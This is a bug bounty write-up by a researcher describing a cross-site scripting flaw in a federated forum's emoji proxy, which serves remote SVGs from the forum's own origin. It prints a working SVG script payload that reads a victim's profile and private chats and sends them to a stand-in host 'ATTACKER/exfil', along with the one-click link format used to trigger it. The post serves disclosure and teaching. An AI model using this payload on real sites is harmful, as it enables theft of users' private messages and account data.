# I Found an XSS That Steals Private Chats Through a Single Emoji Link

- **Source URL:** https://medium.com/@Sh3llwolf/i-found-an-xss-that-steals-private-chats-through-a-single-emoji-link-8c53ba811e7f
- **Fetched from:** https://medium.com/@Sh3llwolf/i-found-an-xss-that-steals-private-chats-through-a-single-emoji-link-8c53ba811e7f?source=rss-1b9ac06a8e8f------2
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:**  (id 14980)
- **Method:** medium-rss-feed (full content:encoded) readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
- **Author/Published (RSS):** sh3llwolf / Thu, 12 Nov 2026 01:51:01 GMT

Hey, I’m M Kiran Kumar a bug bounty hunter. I spend most of my days staring at request/response pairs and poking at features nobody else bothers with. Today was one of those days where boredom actually paid off.

So I was messing around with a federated forum’s emoji endpoint — just curious how it handled remote content when I noticed something weird. The /emoji/ap/ route was fetching remote SVGs and serving them from the forum's own origin.

If you know anything about SVGs, you already know where this is going. 😏

SVG isn’t an image. It’s XML. XML can contain \<script> tags. And if a browser renders an SVG as a document not as an \<img> tag, but as an actual page that script runs.

The forum was doing exactly that. It was proxying remote emoji SVGs through its own domain. Which meant a script inside that SVG would execute in the context of the forum itself.Same-origin. With the victim’s session. Yeah.

Payload

\<svg xmlns=”[http://www.w3.org/2000/svg](http://www.w3.org/2000/svg)">

\<script>

fetch(‘/api/self’, {credentials:’same-origin’})

.then(r=>r.json())

.then(d=>{ new Image().src=’[https://ATTACKER/exfil?d='+btoa(JSON.stringify(d)));](<https://ATTACKER/exfil?d='+btoa(JSON.stringify(d)));>) });

fetch(‘/api/v3/chats?perPage=20’, {credentials:’same-origin’})

.then(r=>r.json())

.then(d=>{ new Image().src=’[https://ATTACKER/exfil?d2='+btoa(JSON.stringify(d));](<https://ATTACKER/exfil?d2='+btoa(JSON.stringify(d));>) });

\</script>

\</svg>

Then I sent a victim this link:

[https://target/emoji/ap/pwn1/attacker-host](https://target/emoji/ap/pwn1/attacker-host)

The forum fetched the SVG. Served it from its own origin. The script ran. Profile data and private chats went straight to my server.

No cookie theft needed. No document.cookie nonsense. The script was already *inside* the origin, so it just asked the forum for the data — and the forum happily answered.

The proxy turns a third-party asset into first-party content. Same-origin policy? Useless here. HttpOnly cookies? Irrelevant. The script doesn't need to read anything it just *asks*.

One click. That’s the whole exploit. Wild, right?

Federation means every remote server is a potential attacker. Don’t render their content from your origin.

M.KiranKumar (sh3llwolf)
